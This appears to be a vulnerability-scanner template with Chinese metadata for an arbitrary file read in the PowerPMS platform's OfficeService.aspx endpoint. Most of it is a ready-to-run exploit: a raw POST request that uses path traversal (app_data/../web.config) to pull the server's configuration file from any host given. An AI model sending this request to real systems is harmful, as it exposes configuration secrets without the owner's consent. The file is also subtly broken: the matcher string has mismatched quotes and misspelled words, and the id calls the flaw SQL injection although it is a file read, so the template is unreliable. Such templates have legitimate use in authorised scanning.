id: powerpms-OfficeService-sqli
info:
  name: 普华Powerpms OfficeService.aspx 文件读取漏洞
  author: leadlife
  severity: high
  description: 普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统OfficeService.aspx接口存在任意文件读取漏洞，攻击者可利用该漏洞读取系统文件，造成敏感信息泄漏
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/svl4l446klk1memg
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: powerpms,fileread

http:
  - raw:
      - |
        POST /PowerPlat/FormXml/DocFile/OfficeService.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 45

        action=download&WEBURL=app_data/../web.config

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'xml versio,'configurationn')
        condition: and